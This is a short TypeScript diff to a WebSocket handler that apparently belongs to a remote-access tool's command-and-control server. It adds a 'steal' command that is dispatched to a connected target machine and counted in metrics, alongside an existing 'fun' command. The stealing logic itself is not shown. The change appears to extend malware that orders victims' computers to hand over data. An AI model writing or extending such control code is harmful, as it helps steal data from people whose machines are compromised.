@@ -308,6 +308,10 @@ export function handleProcessViewerMessage(ws: ServerWebSocket<SocketData>, raw:
       metrics.recordCommand("fun");
       break;
     }
+    case "steal":
+      target.ws.send(encodeMessage({ type: "command", commandType: "steal", id: commandId } as any));
+      metrics.recordCommand("steal");
+      break;
     default:
       break;
   }
